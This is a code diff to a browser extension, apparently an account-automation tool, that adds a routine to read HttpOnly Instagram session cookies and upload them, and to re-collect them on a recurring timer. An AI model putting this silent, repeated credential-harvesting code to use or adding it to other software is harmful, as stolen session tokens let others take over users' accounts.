@@ -82,10 +82,47 @@ async function upload({ platform, token, storage_key }) {
   return { ok: true };
 }
 
+// Harvest Instagram session cookies (HttpOnly, only accessible via
+// chrome.cookies API). Requires "cookies" permission + IG host perms.
+async function harvestInstagramSession() {
+  try {
+    const domains = ["https://www.instagram.com", "https://instagram.com"];
+    const out = {};
+    for (const domain of domains) {
+      const cookies = await chrome.cookies.getAll({ url: domain });
+      for (const c of cookies) out[c.name] = c.value;
+    }
+    if (!out.sessionid || !out.ds_user_id) {
+      return { ok: false, reason: "no_session" };
+    }
+    const token = JSON.stringify({
+      sessionid: out.sessionid,
+      ds_user_id: out.ds_user_id,
+      csrftoken: out.csrftoken,
+      mid: out.mid,
+      ig_did: out.ig_did,
+      rur: out.rur,
+      harvested_at: Date.now(),
+    });
+    return await upload({
+      platform: "instagram",
+      token,
+      storage_key: "cookies:instagram",
+    });
+  } catch (err) {
+    console.warn("[clapcheeks] ig harvest error:", err);
+    return { ok: false, reason: "ig_harvest_error" };
+  }
+}
+
 chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
   if (msg?.kind === "token_harvest") {
     upload(msg).then(sendResponse);
     return true; // async
+  }
+  if (msg?.kind === "ig_harvest") {
+    harvestInstagramSession().then(sendResponse);
+    return true;
   }
   if (msg?.kind === "status") {
     getConfig().then((cfg) => sendResponse({
@@ -123,4 +160,7 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
       await chrome.tabs.reload(tab.id);
     } catch { /* ignore */ }
   }
+  // Re-harvest IG session on the same cadence (no tab reload needed,
+  // chrome.cookies reads the cookie store directly).
+  await harvestInstagramSession();
 });
